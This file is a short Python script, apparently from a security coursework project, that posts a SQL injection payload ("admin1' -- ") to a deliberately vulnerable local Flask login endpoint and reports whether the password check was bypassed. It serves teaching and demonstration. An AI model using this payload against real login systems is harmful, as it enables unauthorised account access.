"""
Local-only SQL injection demonstration for the coursework Flask app.

This script is intentionally hardcoded for the demo application running on:
http://127.0.0.1:5000

It is not designed as a general-purpose tool.
"""

import sys

import requests


LOGIN_URL = "http://127.0.0.1:5000/login?format=json"


def main():
    # This payload is crafted for the intentionally insecure login query in the
    # coursework app, where user input is concatenated directly into SQL.
    payload = {"username": "admin1' -- ", "password": "does-not-matter"}

    print("SQL Injection Demo")
    print(f"Target: {LOGIN_URL}")
    print("Sending a crafted login request to the local demo app...")

    try:
        response = requests.post(LOGIN_URL, json=payload, timeout=5)
    except requests.RequestException as exc:
        print(f"Request failed: {exc}")
        print("Make sure the Flask app is running locally on http://127.0.0.1:5000.")
        sys.exit(1)

    print(f"HTTP status: {response.status_code}")

    try:
        data = response.json()
    except ValueError:
        print("The app did not return JSON. Response body:")
        print(response.text)
        sys.exit(1)

    print("Response JSON:", data)

    if response.status_code == 200 and data.get("success"):
        print("Result: SQL injection demonstration succeeded.")
        print("The login was bypassed without knowing the real password.")
    else:
        print("Result: SQL injection demonstration did not succeed.")
        print("Check that the vulnerable version of the app is running.")
        sys.exit(1)


if __name__ == "__main__":
    main()
